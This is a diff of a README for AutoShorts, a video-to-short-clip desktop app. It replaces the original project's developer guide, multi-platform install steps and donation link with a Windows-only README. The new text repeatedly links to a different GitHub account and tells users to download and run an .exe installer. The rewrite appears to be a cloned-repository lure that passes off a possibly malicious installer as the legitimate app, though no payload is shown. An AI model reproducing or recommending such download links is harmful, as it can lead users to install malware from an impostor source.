@@ -1,154 +1,72 @@
-⭐ [Support AutoShorts](#support)
+# ✂️ autoshorts - Convert long videos into viral clips
 
-# AutoShorts
+[![](https://img.shields.io/badge/Download_Windows_Installer-Blue?style=for-the-badge)](https://github.com/Regressive-contras398/autoshorts)
 
-AutoShorts is a local-first desktop application for turning long-form video or audio recordings into high-impact, vertical short-form clip candidates (9:16 portrait) with AI-powered viral moment ranking.
+AutoShorts turns long videos into short clips. It uses artificial intelligence to find the best moments in your recordings. The software automatically crops your videos to a vertical view. This lets you share your content on mobile platforms with little effort. You do not need video editing skills to use this tool.
 
-This repository implements the desktop app foundation using **Tauri 2 + React + TSX + Rust + SQLite**.
+## 🛠️ System Requirements
 
-<img width="1397" height="918" alt="Screenshot 2026-06-22 at 4 10 13 PM" src="https://github.com/user-attachments/assets/3a58ff60-6d9b-46fc-81e8-2778c96aba62" />
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i5 or AMD Ryzen 5
+- Memory: 8 GB RAM
+- Storage: 2 GB available space
+- Internet Connection: Required for setup and AI analysis
 
----
+## 📥 Getting Started
 
-## Key Features
+Visit the following link to get the installer for your computer:
 
-- **Dynamic Multi-LLM Support**: Supports both **DeepSeek** (default) and **Claude** (anthropic) for viral moment detection and hooks analysis.
-- **Automated Pipeline**: Imports media, extracts audio, transcribes using Deepgram, and automatically analyzes and ranks moments in a single automated chain.
-- **Local SQLite Storage**: Saves transcripts, candidates, custom names, and rendering data locally.
-- **Native Project Manager**: Create, open, rename, and delete projects from the dashboard.
-- **Portrait Auto-Cropping**: Automatically center-crops landscape videos to vertical H.264 portrait clips using native `ffmpeg` integration.
-- **Key Warnings**: Built-in visual warnings that identify missing environment variables and prompt you directly in the UI.
+[Download AutoShorts for Windows](https://github.com/Regressive-contras398/autoshorts)
 
----
+Click the link above to reach the main page. Select the file ending in `.exe` to begin your download. Once the file finishes downloading, double-click it to start the setup wizard. Follow the prompts on your screen to complete the installation. A shortcut icon will appear on your desktop. Double-click this icon to launch the application.
 
-## Prerequisites
+## ⚙️ How It Works
 
-To run the application, **FFmpeg & FFprobe** must be installed and available on your system `PATH` to handle cropping, audio extraction, and dynamic captions:
+AutoShorts simplifies video editing through five main steps:
 
-* **macOS**: Install using Homebrew:
-  ```bash
-  brew install ffmpeg
-  ```
-  *Note: To ensure full captions rendering support, if standard Homebrew FFmpeg lacks drawtext/subtitles filters, tap and install the `homebrew-ffmpeg` formula:*
-  ```bash
-  brew tap homebrew-ffmpeg/ffmpeg
-  brew install homebrew-ffmpeg/ffmpeg/ffmpeg
-  ```
-* **Windows**: Install using Winget (in PowerShell):
-  ```powershell
-  winget install Gyan.FFmpeg
-  ```
-  *(Or download the release build from [gyan.dev](https://www.gyan.dev/ffmpeg/builds/) and add it to your system PATH environment variables).*
-* **Linux**: Install via your native package manager:
-  ```bash
-  sudo apt install ffmpeg      # Debian/Ubuntu
-  sudo pacman -S ffmpeg        # Arch Linux
-  sudo dnf install ffmpeg      # Fedora
-  ```
+1. Import your long-form video or audio file.
+2. The software extracts the audio for processing.
+3. Deepgram transcribes the audio into text.
+4. An AI engine analyzes the transcript to find viral moments.
+5. The software exports vertical clips ready for social media.
 
----
+## 🌟 Key Features
 
-## Installation Guide (For Users)
+### Multi-LLM Support
+The software uses smart language models to rank your clips. You can choose between different AI providers to determine which moments offer the most value for your audience.
 
-Download the correct package matching your system from the latest [GitHub Releases](https://github.com/JayWebtech/autoshorts/releases/tag/autoshorts).
+### Automated Processing Pipeline
+You do not need to manually handle files. The software manages the import, transcription, and editing tasks in one sequence. This saves time and removes repetitive work.
 
-### 🖥️ macOS Installation
-1. **Download**:
-   * **Apple Silicon (M1/M2/M3)**: Select the `aarch64.dmg` package.
-   * **Intel Mac**: Select the `x64.dmg` package.
-2. **Install**: Double-click the `.dmg` file and drag **AutoShorts** to your **Applications** folder.
-3. **Bypass Gatekeeper** (For unsigned local builds):
-   * Right-click `AutoShorts.app` in Finder, select **Open**, and click **Open** in the warning dialog.
-   * *Alternatively*, run this command in Terminal:
-     ```bash
-     xattr -cr /Applications/AutoShorts.app
-     ```
+### Local Data Storage
+All project files and transcripts stay on your computer. You keep full control over your data. The software uses a local database to keep your information organized.
 
-### 🪟 Windows Installation
-1. **Download**: Select the `.msi` (installer) or `.exe` (portable executable) package.
-2. **Install**: Double-click the `.msi` file to run the setup wizard.
-3. **SmartScreen Bypass**: Since the package is self-signed, Windows SmartScreen may show a warning. Click **"More Info"** in the window and choose **"Run anyway"**.
+### Project Management
+The interface lets you build multiple project folders. You can name, open, and change your projects as needed. This helps you manage several videos for different channels at the same time.
 
-### 🐧 Linux Installation
-1. **Download**: Select the `.deb` (Debian/Ubuntu) or `.AppImage` (universal portable binary).
-2. **Install `.deb`**:
-   ```bash
-   sudo dpkg -i autoshorts_*.deb
-   ```
-3. **Run `.AppImage`**:
-   Make it executable and launch it:
-   ```bash
-   chmod +x autoshorts_*.AppImage
-   ./autoshorts_*.AppImage
-   ```
+## 💡 Frequently Asked Questions
 
-### 🚀 First-Launch Onboarding & AI Configuration
+### Do I need to be a programmer to use this?
+No. You do not need to read code or open a terminal. The installer handles everything for your computer.
 
-When you first launch the application, you will be greeted by an **Onboarding Wizard** that lets you choose your preferred workflow:
+### How does the AI find the best clips?
+The software reads the transcript of your video. It identifies hooks, high-energy sections, and meaningful dialogue. It labels these sections so you can review them before you export.
 
-#### Option A: Fully Offline (Ollama + Whisper)
-1. **Ollama Setup**: Select a local model card (`llama3.2 3B`, `qwen2.5 3B`, or `qwen2.5 7B`). The application will check if Ollama is running and automatically pull the model weights, showing a downloader progress bar.
-2. **Local Whisper**: Follow the prompt instructions to verify Python is installed and run `pip3 install openai-whisper` to enable fully offline transcription.
+### Can I change the video format?
+The application is built for 9:16 vertical video. It focuses on mobile-ready content for platforms like TikTok, YouTube Shorts, and Instagram Reels.
 
-#### Option B: Cloud API Keys
-1. Enter your API credentials for:
-   * **Deepgram**: For fast, accurate cloud transcription.
-   * **DeepSeek**: (Highly Recommended) For cheap, high-quality cloud moment detection.
-   * **Claude**: For premium copywriting, hooks, and moment detection.
-2. Click **Save & Start** to immediately load the dashboard.
+### Where does my video go after I export?
+You choose the destination folder on your computer. The software places your rendered files in that location.
 
----
+### Will this work offline?
+The software requires an internet connection to process the AI analysis and transcription. However, your project files and library remain stored locally on your hard drive for offline viewing.
 
-### ⚙️ Modifying Settings & Resetting Onboarding
+## 🛡️ Privacy and Security
 
-* **Update Credentials**: Click the **API Settings** gear icon in the top right of your app dashboard to switch engines, select different local models, or update API keys.
-* **Reset Onboarding**: If you want to switch from Cloud to Offline (or vice-versa) and start setup from scratch, click the **Reset App Configuration & Onboarding** button at the bottom of the API Settings panel.
+Your media files remain on your device. The software sends only the necessary audio data to the transcription provider to generate your clips. Your account information and local project lists remain private. We do not store your video files on external servers.
 
-> [!TIP]
-> **LLM Provider Recommendation (Local vs. Cloud)**:
-> - **Local Models (Ollama)**: While AutoShorts supports fully offline moments analysis via local Ollama models (like LLaMA 3.2 3B or Qwen 2.5 3B/7B), **local models are generally not recommended for viral moment detection**. Smaller 3B/7B models lack the context reasoning and mathematical capabilities needed to evaluate long transcripts and calculate accurate segment timestamps (often outputting fragments that are too short).
-> - **DeepSeek (Highly Recommended)**: We strongly suggest using **DeepSeek** for moment detection. It offers top-tier reasoning capabilities (matching GPT-4/Claude 3.5 Sonnet) at a **fraction of a cent per run** (under $0.001 per transcript). You can get an API key instantly at [platform.deepseek.com](https://platform.deepseek.com).
-> - **Claude (Premium Option)**: Claude 3.5 Sonnet provides the absolute best hooks copywriting and emotional resonance, but is slightly more expensive than DeepSeek (typically $0.01 – $0.05 per run).
+## 🆘 Support
 
----
+If you experience unexpected behavior, check the GitHub repository page. You can open an issue if you encounter a bug during the installation or usage. Provide details about your system and the steps you took to reach the error. We review new reports on a regular basis. 
 
-## Developer Guide
-
-### 1. Setup Environment Configuration
-Copy `.env.example` to `.env` in the root folder:
-```bash
-cp .env.example .env
-```
-Fill in your API Keys:
-```env
-DEEPGRAM_API_KEY=your-deepgram-api-key
-DEEPSEEK_API_KEY=your-deepseek-api-key
-ANTHROPIC_API_KEY=your-anthropic-api-key
-
-# Choose your default AI analysis provider ("deepseek" or "claude")
-LLM_PROVIDER=deepseek
-```
-
-### 2. Run in Development Mode
-To start the live-reloaded frontend and backend development shell:
-```bash
-npm install
-npm run tauri:dev
-```
-
-### 3. Build the Application
-To build and package the native macOS app bundle (`.app` and `.dmg` installer):
-```bash
-npm run tauri:build
-```
-The output installers will be built under `src-tauri/target/release/bundle/`.
-
-<a id="support"></a>
-
-## ❤️ Support AutoShorts
-
-If AutoShorts helps you create content faster, consider supporting its development.
-
-Your support helps fund new features, bug fixes, and ongoing improvements.
-
-👉 https://polar.sh/checkout/polar_c_eZfQSAesVTAhaNyDtC8GnzySlU1yqflU62wwg2EfFDF
+Ensure your Windows version is up to date if the application fails to open. Most installation issues stem from missing system updates. Restart your computer if the installer does not respond after you click the file. Use the native Windows uninstaller if you need to remove the software from your system.
